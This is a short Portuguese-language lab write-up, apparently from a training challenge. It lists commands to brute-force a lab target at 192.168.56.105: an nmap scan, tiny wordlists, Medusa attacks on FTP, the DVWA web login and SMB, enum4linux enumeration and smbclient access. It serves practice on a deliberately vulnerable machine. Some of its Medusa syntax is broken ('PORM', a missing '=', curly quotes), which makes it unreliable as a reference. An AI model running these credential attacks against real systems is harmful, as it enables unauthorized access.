
# Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux

Desafio Simulado de Ataque de Brute Force de Senhas com Medusa e Kali Linux

IP Meta: 192.168.56.105 /24

## Lista de comandos

Comandos a seram utilizados em terminal

### Criando Arquivos de Usuários e Senhas Comuns

nmap -sV -p 21,22,80,445,139 192.168.56.105

Para criar a lista de usuários comuns:
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

Para criar a lista de senhas comuns:
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Ataque por Medusa:
medusa -h 192.168.56.105 -U users.txt -P pass.txt -M ftp -t 6

### Ataques de Força Bruta em Formulários Web

#### Utilizando o DVWA

Abrir Firefox e digitar >> 192.168.56.105/dvwa/login.php

Apertar F12 no teclado e mudar para a barra Network

#### Criação de Wordlists

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

### Utilizando Medusa para Simular Combinações de Acesso

medusa -h 192.168.56.105 -U users.txt -P pass.txt -M http \
-m PAGE: ‘/dvwa/login.php’ \
-m PORM: ‘username=<USER>&password<PASS>&Login=Login’ \
-m ‘FAIL=Login failed’ -t 6

### Simulando um Cenário Corporativo Mal Configurado

Utilizando o Enumerador e gerando um arquivo com os resultados:

enum4linux -a 192.168.56.105 | tee enum4_output.txt

Abrindo os resultados contidos no arquivo gerado:

less enum4_output.txt

### Criando uma Lista de Usuários

#### Wordlist de Usuários:

echo -e "user\nmsfadmin\nservice" > smb_users.txt

#### Wordlist de Senhas:

echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

### Testando ataque com a ferramenta medusa:

medusa -h 192.168.56.105 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

### Testando o Acesso Utilizando Smbclient

smbclient -L //192.168.56.105 -U msfadmin



